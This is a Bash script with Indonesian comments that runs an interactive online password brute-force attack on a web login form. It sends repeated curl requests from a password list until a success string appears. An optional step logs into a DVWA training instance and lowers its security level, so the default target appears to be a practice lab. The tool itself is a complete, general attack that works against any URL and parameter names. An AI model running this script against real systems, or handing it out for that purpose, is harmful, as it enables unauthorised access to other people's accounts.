#!/bin/bash

# --- BAGIAN INPUT INTERAKTIF UTAMA ---
read -p "[?] Input Target URL (contoh http://10.10.10.5:8000): " TARGET
TARGET="${TARGET:-http://127.0.0.1:8000}"

read -p "[?] Input path halaman target/brute (contoh /vulnerabilities/brute/): " PATH_TARGET
PATH_TARGET="${PATH_TARGET:-/vulnerabilities/brute/}"

read -p "[?] Pilih Metode Request [1] GET (Default) [2] POST: " METHOD_CHOICE
METHOD_CHOICE="${METHOD_CHOICE:-1}"

read -p "[?] Input nama parameter username (default username): " USER_PARAM
USER_PARAM="${USER_PARAM:-username}"

read -p "[?] Input nama parameter password (default password): " PASS_PARAM
PASS_PARAM="${PASS_PARAM:-password}"

read -p "[?] Input nama tombol submit/Login (default Login): " SUBMIT_PARAM
SUBMIT_PARAM="${SUBMIT_PARAM:-Login}"

read -p "[?] Input target username: " USER
USER="${USER:-admin}"

read -p "[?] Input file name passlist: " PASS_FILE

read -p "[?] Input teks penanda sukses / Flag (default 'Welcome to the password protected area'): " SUCCESS_TEXT
SUCCESS_TEXT="${SUCCESS_TEXT:-Welcome to the password protected area}"

echo "-----------------------------------------------"

COOKIE="./cookie.txt"
rm -f "$COOKIE"

# Opsional: Jika target adalah DVWA (perlu login & set security low)
read -p "[?] Apakah ini target DVWA yang butuh login awal? (y/n): " IS_DVWA
if [[ "$IS_DVWA" =~ ^[Yy]$ ]]; then
    echo "[*] Login awal ke DVWA..."
    PAGE=$(curl -s -c "$COOKIE" "$TARGET/login.php")
    T1=$(echo "$PAGE" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")
    curl -s -L -b "$COOKIE" -c "$COOKIE" --data "username=admin&password=password&Login=Login&user_token=$T1" "$TARGET/login.php" > /dev/null

    echo "[*] Ganti ke security LOW..."
    SEC_PAGE=$(curl -s -b "$COOKIE" "$TARGET/security.php")
    T2=$(echo "$SEC_PAGE" | sed -n "s/.*user_token.*value=['\"]\([^'\"]*\).*/\1/p")
    # Perbaikan: Menghapus $SECURITY_PAGE agar tidak blank argument
    curl -s -L -b "$COOKIE" -c "$COOKIE" --data "security=low&seclev_submit=Submit&user_token=$T2" "$TARGET/security.php" > /dev/null
fi

echo "[+] Target Aktif: $TARGET$PATH_TARGET [Low/Standard Mode]"
echo "-----------------------------------------------"

while read -r PASS; do
  if [ "$METHOD_CHOICE" = "2" ]; then
    RESP=$(curl -s -X POST \
      --data-urlencode "$USER_PARAM=$USER" \
      --data-urlencode "$PASS_PARAM=$PASS" \
      --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
      -b "$COOKIE" "$TARGET$PATH_TARGET")
  else
    RESP=$(curl -s -G \
      --data-urlencode "$USER_PARAM=$USER" \
      --data-urlencode "$PASS_PARAM=$PASS" \
      --data-urlencode "$SUBMIT_PARAM=$SUBMIT_PARAM" \
      -b "$COOKIE" "$TARGET$PATH_TARGET")
  fi

  echo -e "\e[31m[-] Trying: $PASS\e[0m"

  if echo "$RESP" | grep -q "$SUCCESS_TEXT"; then
    echo ""
    echo -e "\e[32m[+] FOUND! -> $PASS\e[0m"
    break
  fi
done < "$PASS_FILE"

rm -f "$COOKIE"

